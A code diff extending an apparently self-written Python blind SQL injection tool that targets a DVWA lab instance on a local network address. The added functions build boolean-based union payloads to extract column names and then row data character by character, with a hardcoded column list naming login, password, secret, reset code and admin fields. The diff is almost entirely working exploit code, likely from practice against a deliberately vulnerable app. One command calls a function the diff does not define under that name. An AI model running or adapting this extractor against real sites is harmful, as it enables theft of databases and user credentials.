@@ -11,6 +11,7 @@ exit = 0
 delay = 10
 stop = False
 database_list = []
+all_data_list = {}
 r = requests.Session()
 url="http://192.168.1.26:8080/dvwa/vulnerabilities/sqli_blind/"
 data = {
@@ -81,7 +82,7 @@ def exit_mole():
 #    global exit
 #    exit = 1
     print("\nBye!\n")
-    time.sleep(2)
+    time.sleep(1)
     sys.exit()
 
 # -----------------------------------------------------------------------
@@ -90,7 +91,39 @@ def exit_mole():
 
 def execute_command(command):
 
-    if command.startswith("show tables from "):
+    if command.startswith("show data from "):
+
+        selected_database_table = command.split("show data from ")[1]
+        if "/" in selected_database_table:
+
+            selected_database = selected_database_table.split("/")[0]
+            selected_table = selected_database_table.split("/")[1]
+
+            show_data(selected_database, selected_table)
+
+        else:
+
+            print("\nWrong syntax!")
+
+    elif command.startswith("get data from "):
+
+        selected_database_table = command.split("get data from ")[1]
+        if "/" in selected_database_table:
+
+            selected_database = selected_database_table.split("/")[0]
+            selected_table = selected_database_table.split("/")[1]
+
+            #column_list = get_data_columns(selected_database, selected_table)
+            column_list = ['id', 'login', 'password', 'email', 'secret', 'activation_code', 'activated', 'reset_code', 'admin']
+
+            print(column_list)
+
+            get_data(selected_database, selected_table, column_list)
+
+        else:
+            print("\nWrong syntax!")
+
+    elif command.startswith("show tables from "):
 
         selected_database = command.split("show tables from ")[1]
         show_tables(selected_database)
@@ -124,6 +157,242 @@ def execute_command(command):
     else:
 
         print_help()
+
+# ------------------------------------------------------------------
+
+# ------------------------------ Data ------------------------------
+
+def show_databases(selected_database, selected_table):
+    #print("")
+    #for i in range(len(database_list)):
+    #    print(str(i+1)+") "+database_list[i])
+    print(all_data_list[selected_database+"/"+selected_table])
+
+def get_data_char(selected_database, selected_table, column, data_, char):
+
+    char = char + 1
+
+    return_char = "?"
+    for ascii in range(128):
+
+        if stop == True:
+            return "exit"
+
+        data = {
+            'id': "1' and 1=0 union "+
+                "select 1, 1 "+
+                "from information_schema.tables "+
+                "where ascii(substring((select "+column+" from "+selected_database+"."+selected_table+" limit "+str(data_)+", 1), "+str(char)+", 1)) = "+str(ascii)+"#",
+            'Submit': 'Submit'
+            }
+
+        response = r.get(url, params=data, cookies=cookies).text
+
+        if pass_phrase in response:
+            return_char = chr(ascii)
+            break
+        elif deny_phrase in response:
+            continue
+        else:
+            return return_char
+
+    return return_char
+
+def get_data_num_char(selected_database, selected_table, column, data_):
+
+    num_chars = 0
+    while True:
+
+        data = {
+            'id': "1' and 1=0 union "+
+                "select 1, 1 "+
+                "from information_schema.tables "+
+                "where (select length("+column+") from "+selected_database+"."+selected_table+" limit "+str(data_)+", 1) = "+str(num_chars)+"#",
+            'Submit': 'Submit'
+            }
+
+        response = r.get(url, params=data, cookies=cookies).text
+
+        print(response)
+
+        if pass_phrase in response:
+            break
+        elif deny_phrase in response:
+            num_chars = num_chars + 1
+            continue
+        else:
+            return 0
+
+    return num_chars
+
+def get_num_data(selected_database, selected_table, column):
+
+    num_data = 0
+    while True:
+
+        data = {
+            'id': "1' and 1=0 union "+
+                "select 1, 1 "+
+                "from information_schema.tables "+
+                "where (select count("+column+") from "+selected_database+"."+selected_table+") = "+str(num_data)+"#",
+            'Submit': 'Submit'
+            }
+
+        response = r.get(url, params=data, cookies=cookies).text
+
+        if pass_phrase in response:
+            break
+        elif deny_phrase in response:
+            num_data = num_data + 1
+            continue
+        else:
+            return 0
+
+    return num_data
+
+def get_data(selected_database, selected_table, column_list):
+
+    #status = check_options()
+
+    global all_data_list
+    all_data_list[selected_database+"/"+selected_table] = []
+    data_list = {}
+
+    if 1==1:
+        for round, column in enumerate(column_list):
+
+            data_list[column] = []
+
+            if round == 0:
+                num_data = get_num_data(selected_database, selected_table, column)
+
+            print("\n["+column+"]\n")
+            for data in range(num_data):
+                num_chars = get_data_num_char(selected_database, selected_table, column, data)
+                index = data + 1
+                data_name = ""
+                for char in range(num_chars):
+                    char = get_data_char(selected_database, selected_table, column, data, char)
+                    if char == "exit":
+                        return
+                    data_name = data_name + char
+                    time.sleep(delay/2)
+                data_list[column].append(data_name)
+                time.sleep(delay)
+                print(str(index)+") "+data_name)
+        #all_data_list[selected_database+"\"+selected_table].append(data_list[column])
+    else:
+        pass
+
+# --------------------------------------------------------------------------
+
+# ------------------------------ Data Columns ------------------------------
+
+def get_data_column_char(selected_database, selected_table, column, char):
+
+    char = char + 1
+
+    return_char = "?"
+    for ascii in range(128):
+
+        if stop == True:
+            return "exit"
+
+        data = {
+            'id': "1' and 1=0 union "+
+                "select 1, 1 "+
+                "from information_schema.tables "+
+                "where ascii(substring((select column_name from information_schema.columns where table_schema='"+selected_database+"' AND table_name='"+selected_table+"' limit "+str(column)+", 1), "+str(char)+", 1)) = "+str(ascii)+"#",
+            'Submit': 'Submit'
+            }
+
+        response = r.get(url, params=data, cookies=cookies).text
+
+        if pass_phrase in response:
+            return_char = chr(ascii)
+            break
+        elif deny_phrase in response:
+            continue
+        else:
+            return return_char
+
+    return return_char
+
+def get_data_column_num_char(selected_database, selected_table, column):
+
+    num_chars = 0
+    while True:
+
+        data = {
+            'id': "1' and 1=0 union "+
+                "select 1, 1 "+
+                "from information_schema.tables "+
+                "where (select length(column_name) from information_schema.columns where table_schema='"+selected_database+"' AND table_name='"+selected_table+"' limit "+str(column)+", 1) = "+str(num_chars)+"#",
+            'Submit': 'Submit'
+            }
+
+        response = r.get(url, params=data, cookies=cookies).text
+
+        if pass_phrase in response:
+            break
+        elif deny_phrase in response:
+            num_chars = num_chars + 1
+            continue
+        else:
+            return 0
+
+    return num_chars
+
+def get_num_data_columns(selected_database, selected_table):
+
+    num_data_columns = 0
+    while True:
+
+        data = {
+            'id': "1' and 1=0 union "+
+                "select 1, 1 "+
+                "from information_schema.tables "+
+                "where (select count(column_name) from information_schema.columns where table_schema='"+selected_database+"' AND table_name='"+selected_table+"') = "+str(num_data_columns)+"#",
+            'Submit': 'Submit'
+            }
+
+        response = r.get(url, params=data, cookies=cookies).text
+
+        if pass_phrase in response:
+            break
+        elif deny_phrase in response:
+            num_data_columns = num_data_columns + 1
+            continue
+        else:
+            return 0
+
+    return num_data_columns
+
+def get_data_columns(selected_database, selected_table):
+
+    #status = check_options()
+
+    #global database_list
+    data_column_list = []
+
+    if 1==1:
+        num_data_columns = get_num_data_columns(selected_database, selected_table)
+        print("")
+        for column in range(num_data_columns):
+            num_chars = get_data_column_num_char(selected_database, selected_table, column)
+            index = column + 1
+            data_column_name = ""
+            for char in range(num_chars):
+                char = get_data_column_char(selected_database, selected_table, column, char)
+                if char == "exit":
+                    return
+                data_column_name = data_column_name + char
+            data_column_list.append(data_column_name)
+            time.sleep(delay)
+            #print(str(index)+") "+database_name)
+        return data_column_list
+    else:
+        pass
 
 # ----------------------------------------------------------------------
 
@@ -163,7 +432,7 @@ def get_table_char(selected_database, table, char):
         elif deny_phrase in response:
             continue
         else:
-            return "error"
+            return return_char
 
     return return_char
 
@@ -188,7 +457,7 @@ def get_table_num_char(selected_database, table):
             num_chars = num_chars + 1
             continue
         else:
-            return "error"
+            return 0
 
     return num_chars
 
@@ -213,7 +482,7 @@ def get_num_tables(selected_database):
             num_tables = num_tables + 1
             continue
         else:
-            return "error"
+            return 0
 
     return num_tables
 
@@ -277,7 +546,7 @@ def get_database_char(database, char):
         elif deny_phrase in response:
             continue
         else:
-            return "error"
+            return return_char
 
     return return_char
 
@@ -302,7 +571,7 @@ def get_database_num_char(database):
             num_chars = num_chars + 1
             continue
         else:
-            return "error"
+            return 0
 
     return num_chars
 
@@ -327,7 +596,7 @@ def get_num_databases():
             num_databases = num_databases + 1
             continue
         else:
-            return "error"
+            return 0
 
     return num_databases
 
